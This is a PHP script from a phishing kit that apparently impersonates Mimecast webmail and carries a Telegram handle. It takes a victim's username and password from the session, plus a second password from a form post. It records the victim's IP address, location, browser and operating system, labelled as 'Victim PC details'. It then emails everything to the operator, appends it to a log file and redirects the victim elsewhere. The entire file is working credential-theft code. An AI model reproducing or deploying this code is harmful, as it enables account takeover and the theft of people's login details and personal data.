<?php
// Telegram: @guccibase
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');



$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$pass = $_SESSION['password'];
$pass2 = $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "| UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "| Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "| Os : " . $systemInfo['os'] . "";
$data = "
<^>-----------------------GucciBase-----------------------<^>

<^>Personal details<^>
Username : $user
Password : $pass
Second password : $pass2

<^>Victim PC details<^>
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
<^>-----------------------GucciBase-----------------------<^>
";



if ($sendEmail === 1) {

    mail($to,   "Mimecast from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/webmail.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}


header('Location: ' . $ExitLink);
exit;
?>
